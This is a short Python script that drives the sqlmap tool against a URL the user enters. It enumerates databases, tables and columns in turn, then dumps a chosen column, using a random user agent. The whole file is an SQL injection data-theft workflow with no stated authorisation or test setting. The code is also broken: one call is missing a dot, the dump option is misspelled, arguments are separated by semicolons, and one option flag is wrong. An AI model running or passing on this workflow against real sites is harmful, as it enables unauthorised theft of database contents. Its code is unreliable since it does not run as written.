import os 

url = input('Enter url: ')
sqlmap1 = os system('sqlmap --url {} --dbs --random-agent'.format(url))
dbs = input('Enter dbs: ')
sqlmap2 = os.system('sqlmap --url {} -D {} --tables --random-agent'.format(url,dbs))
tapl = input('Enter tab: ')
sqlmap3 = os.system('sqlmap --url {} -D {} -T {} --columns --random-agent'.format(url,dbs,tapl))
colm = input('Enter colm: ')
sqlmap4 = os.system('sqlmap --url {} -D {} -T {} -c {} --dunp --random-agent'.format(url;dbs;tapl;colm))